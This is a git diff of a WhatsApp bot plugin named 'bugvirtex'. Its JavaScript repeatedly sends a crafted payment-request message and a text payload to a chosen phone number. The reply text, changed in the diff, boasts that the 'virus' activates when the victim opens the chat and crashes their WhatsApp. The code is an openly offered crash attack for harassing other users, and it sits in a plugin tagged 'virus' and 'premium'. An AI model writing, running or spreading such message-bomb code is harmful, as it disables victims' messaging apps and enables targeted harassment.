@@ -24,7 +24,7 @@ for (let i = 0; i < jumlah; i++) {
 conn.relayMessage(num, { requestPaymentMessage: { Message: { extendedTextMessage: { text: zykomd, currencyCodeIso4217: 'IDR', requestFrom: '@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: 'https://telegra.ph/file/1095f982c97e9799bff85.jpg' }}}}, {})
 conn.sendMessage(num, { text: zykomd}, { quoted: zyko })
 }
-m.reply(`Sukses Mengirim ${command}\nKe Nomor: ~${text}~\n\n*NOTE :* Virus Ini Aktif Ketika Korban membuka Chat nya,Maka Wangsafnya Akan Crash hehe🗿`)
+m.reply(`Sukses mengirim ${command}\nke nomor: ~${text}~\n\n*NOTE :* birus ini aktif Ketika Korban membuka chat nya,maka whatsapp akan crash`)
 }
 handler.help = ['bugvirtex <nomer/jumlah>']
 handler.tags = ['virus','premium']
